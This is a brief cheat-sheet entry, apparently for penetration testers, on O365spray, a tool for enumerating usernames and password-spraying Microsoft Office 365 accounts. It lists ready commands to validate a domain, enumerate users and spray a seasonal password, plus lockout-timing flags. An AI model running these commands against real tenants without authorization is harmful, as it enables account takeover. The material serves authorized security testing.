[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh).
```shell-session
$ python3 o365spray.py --validate --domain msplaintext.xyz
$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --domain msplaintext.xyz
```
# Useful flags
- `--count`
- `--lockout`